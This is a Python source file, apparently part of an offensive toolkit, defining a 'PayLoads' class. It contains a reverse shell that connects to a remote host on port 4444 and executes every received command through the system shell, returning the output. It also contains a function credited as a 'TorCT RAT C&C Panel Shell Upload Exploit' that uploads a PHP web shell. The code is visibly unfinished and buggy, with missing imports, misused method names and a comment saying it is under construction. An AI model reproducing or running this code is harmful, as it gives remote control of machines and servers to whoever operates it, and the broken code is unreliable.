import socket
import subprocess
import sys
import requests
from Webcrawler import WebCrawler

colors = {
    'BLUE': '\33[1;94m',
    'RED': '\033[1;91m',
    'WHITE': '\33[1;97m',
    'YELLOW': '\33[1;93m',
    'MAGENTA': '\033[1;35m',
    'GREEN': '\033[1;32m',
    'END': '\033[0m',
}


class PayLoads(WebCrawler):

    global colors
    # Under construction (Having problems debugging)

    def __init__(self, base_url, host, port=4444):
        super().__init__(base_url)
        self.host = host
        self.port = port

    def connection(self):
        sockObj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockObj.connect((self.host, self.port))

        return sockObj

    def await(sockObj):
        data = sockObj.recv(2048)

        if data == "exit\n":
            sockObj.close()
            sys.exit()
        # nothing
        elif len(data) == 0:
            return True
        else:
            process = subprocess.Popen(
                                    data, shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE
                                    )
            stdout = process.stdout.read() + process.stderr.read()
            sockObj.send(stdout)
            return False

    def run(self):
        while True:
            dead = False
            try:
                sockObj = connection((self.host, self.port))
                while not dead:
                    dead = await(sockObj)
                sockObj.close()
            except Exception as e:
                print(colors["RED"], "Error ", e, colors["END"])

    # TorCT RAT C&C Panel Shell Upload Exploit
    # Credits -->  Darren Martyn
    def upload_shell(url, shell="/your/shell.php"):
        try:
            files = {
                'file': open(shell, "rb")
            }

            req = requests.post(url=url, files=files)
        except Exception as e:
            print(colors["RED"], "---\t FAILED \t---", colors["END"])
            print("Error ", e)

        if "File is successfully stored!" in req.text:
            print(colors["GREEN"], "[+] Shell Uploaded!", colors["END"])
            print(colors["MAGENTA"], "It should be in {}".format(url.replace("upload.php", "Upload/%s"%(os.path.basename(shell)))), colors["END"])
        else:
            sys.exit()
